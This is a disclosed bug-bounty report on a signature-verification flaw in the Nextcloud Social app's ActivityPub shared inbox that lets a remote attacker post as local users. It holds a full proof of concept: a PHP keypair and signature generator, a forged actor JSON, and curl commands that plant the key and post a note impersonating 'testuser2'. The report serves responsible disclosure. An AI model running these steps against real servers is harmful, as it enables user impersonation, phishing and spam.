# Remote attacker can impersonate Social users via ActivityPub API

## Report Details
- **Report ID**: 461308
- **URL**: https://hackerone.com/reports/461308
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2018-12-12T15:31:47.965Z
- **Disclosed**: 2019-02-01T08:57:05.404Z

## Reporter
- **Username**: tomk
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nextcloud

## Vulnerability Information
Hi there! First up I want to acknowledge that Social may not be in scope. I emailed security@nextcloud.com, which pointed me here, and I wasn't sure whether to just put it in a GitHub issue. In any case I hope I'm not wasting your time.

When an HTTP request arrives at the shared inbox endpoint there are problems in the Signature header checks. A remote unauthenticated attacker is able to partially impersonate users on the victim server. They can post messages on behalf of their victims, which will be visible in their own Home timelines and also in the Home timelines of any of their followers on the same server. Other actions are likely possible also, but this makes a clear example.

I have verified the issue on Social 0.1.0 with NextCloud 15.0.0.

* When an unknown remote Actor is downloaded using the keyId URL, the response's "id" field is not checked that it is from the same origin, which means it can be arbitrarily spoofed. This is the main problem.
* When a Signature header is verified, any public key will do provided it comes from the correct origin, i.e., the key belongs to an Actor whose id has an origin that is somehow authoritative for the ActivityPub Item. This is normally okay since all the private keys for a given origin are on the same server. However due to the previous point, an attacker can insert their own pubkey for anybody else's server.

This is most clearly explained with steps to reproduce. Here I want to attack the server https://███████ and post a message impersonating "testuser2".

First, I use a short PHP script `gen_request.php` that borrows some code from Social to generate a keypair, and give me a signature suitable for posting to the shared inbox.

    <?php

    // Use same key type and generation code as inside Nextcloud social
    $res = openssl_pkey_new(
            [
                    "digest_alg"       => "rsa",
                    "private_key_bits" => 2048,
                    "private_key_type" => OPENSSL_KEYTYPE_RSA,
            ]
    );

    openssl_pkey_export($res, $privateKey);
    $publicKey = openssl_pkey_get_details($res)['key'];

    // Generate a valid request
    $data = "(request-target): post /nextcloud/index.php/apps/social/inbox";

    openssl_sign($data, $signed, $privateKey, OPENSSL_ALGO_SHA256);
    echo "Shared inbox request, signed\n";
    echo base64_encode($signed);
    echo "\n\n";
    echo "Public key\n";
    echo $publicKey;

    ?>

Running this provides some material to use in the following requests.

    Shared inbox request, signed
    YHb7DroSsXgIFGuRFC5tRksVp1tayq+ZMeBP3vG6uNz8lStIjRhtCwzASStyRSrcm4DTlzuQzejQgQxJwq62bsPvzXzUGFub2yap3nyNFxtRbs/xTlpf1ySlhGDeMx1A9XjnEkp/j+wnCQF9j5h7SdnXG/1WSJe8SIBki+ONPwWqkyWRA1V/c76gJp349JnfVg0HkFuFGpIIe2A7Qk+Mbcq66aKx1WJedsL1SkeU3kSqSQIhYR4AvhXIHmj7E6Syg4o2/zHF0BaxbPHqS2VDSPajmE+gL+nhk/UTbOSUB6wzJkWng8ibWQ9Tz4UvYG/xUW8gdDtvU51x3nMfNmmXIQ==

    Public key
    -----BEGIN PUBLIC KEY-----
    MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAmgjLAFCTvqwOCP1IW9Ik
    peiTNBv49RC70dRXi4qpXLe+Sl2IR3O8YUiGzInRyyANM3nPWeHOH3bgF7WBmF5u
    SaUgCga050woQC+DJkkVsjjmtz41z3FZyxRQN+x/zkJjQ96O94yWfXpam/hrW3Q2
    WPHTEjKXyUfxIg0Ik0PcifvdZoCwQS+MbBDkKfToLw0vAhjKtE5zjT8VMwFj7yci
    FpDzaKFHn4NQAr4SuznZW98zRom7XfcuDL5psa28W7S2Te2WVtCfUrkvbByESmN2
    i3U5m0QjWUD34/IU03f+cyALKMNWesMl1mAj8NUfPgoGIa8ISlWYrjDzfGDjbbDc
    /QIDAQAB
    -----END PUBLIC KEY-----

Next I download testuser2's user profile as a template.

    $ curl -H "Accept: application/ld+json" -k https://████/nextcloud/index.php/apps/social/@testuser2

Edit it so that the `id` field is changed to `@mallory`, and the public key is replaced with the one we generated. The rest can stay the same. (Truncated example)

    {"@context":["https:\/\/www.w3.org\/ns\/activitystreams","https:\/\/w3id.org\/security\/v1"],
    "id":"https:\/\/█████\/nextcloud\/index.php\/apps\/social\/@mallory",
    "type":"Person",
    ...
    +cyALKMNWesMl1mAj8NUfPgoGIa8ISlWYrjDzfGDjbbDc\n/QIDAQAB\n-----END PUBLIC KEY-----\n"}}

I place this user JSON in a file on a web-accessible HTTPS server - in this case the URL is `https://███████/mallory.json`. I make the victim server download and process this user by using this URL as a keyId in a signature. The actual signature text and request body does not matter at this point. Verification will fail, but the user will be saved into the table "oc_social_cache_actors" with the "id" set to `https://████/nextcloud/index.php/apps/social/@mallory`. This makes it trusted for requests that concern origin ████.

    $ curl -H 'Signature: keyId="https://██████/mallory.json",headers="(request-target)",signature="x"' -H "Accept: application/ld+json" -X POST -d "" -k -i https://██████/nextcloud/index.php/apps/social/inbox
    HTTP/1.1 500 Internal Server Error
    ...
    {"status":-1,"exception":"OCA\\Social\\Exceptions\\SignatureException","message":"signature cannot be checked"}

Now that mallory's pubkey is trusted, I can submit a Create-Note payload to the shared inbox. The signature for this request URL was already pre-calculated by the PHP script earlier.

For example,

    $ curl -H 'Signature: keyId="https://███/nextcloud/index.php/apps/social/@mallory",headers="(request-target)",signature="YHb7DroSsXgIFGuRFC5tRksVp1tayq+ZMeBP3vG6uNz8lStIjRhtCwzASStyRSrcm4DTlzuQzejQgQxJwq62bsPvzXzUGFub2yap3nyNFxtRbs/xTlpf1ySlhGDeMx1A9XjnEkp/j+wnCQF9j5h7SdnXG/1WSJe8SIBki+ONPwWqkyWRA1V/c76gJp349JnfVg0HkFuFGpIIe2A7Qk+Mbcq66aKx1WJedsL1SkeU3kSqSQIhYR4AvhXIHmj7E6Syg4o2/zHF0BaxbPHqS2VDSPajmE+gL+nhk/UTbOSUB6wzJkWng8ibWQ9Tz4UvYG/xUW8gdDtvU51x3nMfNmmXIQ=="' \
    -H "Accept: application/ld+json" \
    -X POST \
    -d "{\"type\":\"Create\",\"actor\":\"https://█████/nextcloud/index.php/apps/social/@testuser2\",\"to\":[\"https://www.w3.org/ns/activitystreams#Public\"],\"object\":{\"publishedTime\":1544622784,\"@context\":[\"https://www.w3.org/ns/activitystreams\",\"https://w3id.org/security/v1\"],\"id\":\"https://██████████/nextcloud/index.php/apps/social/@testuser2/15446114504147655329\",\"type\":\"Note\",\"to\":\"https://www.w3.org/ns/activitystreams#Public\",\"cc\":[\"https://████████/nextcloud/index.php/apps/social/@testuser2/followers\"],\"actor\":\"https://████/nextcloud/index.php/apps/social/@testuser2\",\"actor_info\":{\"@context\":[\"https://www.w3.org/ns/activitystreams\",\"https://w3id.org/security/v1\"],\"id\":\"https://███████/nextcloud/index.php/apps/social/@testuser2\",\"type\":\"Person\",\"url\":\"https://██████████/nextcloud/index.php/apps/social/@testuser2\",\"local\":true,\"aliases\":[\"@testuser2\",\"users/testuser2\"],\"preferredUsername\":\"testuser2\",\"name\":\"\",\"inbox\":\"https://███/nextcloud/index.php/apps/social/@testuser2/inbox\",\"outbox\":\"https://███/nextcloud/index.php/apps/social/@testuser2/outbox\",\"account\":\"testuser2@█████\",\"following\":\"https://███████/nextcloud/index.php/apps/social/@testuser2/following\",\"followers\":\"https://█████/nextcloud/index.php/apps/social/@testuser2/followers\",\"endpoints\":{\"sharedInbox\":\"https://█████/nextcloud/index.php/apps/social/inbox\"},\"publicKey\":{\"id\":\"https://████████/nextcloud/index.php/apps/social/@testuser2#main-key\",\"owner\":\"https://████████/nextcloud/index.php/apps/social/@testuser2\",\"publicKeyPem\":\"\"}},\"published\":\"2018-12-12T14:44:10+00:00\",\"local\":true,\"content\":\"not really testuser2\",\"attributedTo\":\"https://██████████/nextcloud/index.php/apps/social/@testuser2\",\"inReplyTo\":\"\",\"sensitive\":false,\"conversation\":\"\"}}" \
    -k -i \
    https://████/nextcloud/index.php/apps/social/inbox

Now the payload "not really testuser2" appears in the Home timeline of their followers, like the admin user in the attached screenshot.

## Impact

* Phishing or malware links via seemingly trustworthy local or remote users
* Spam/DoS
* Possibly deleting content (untested)

## Attachments
- admin_home.png
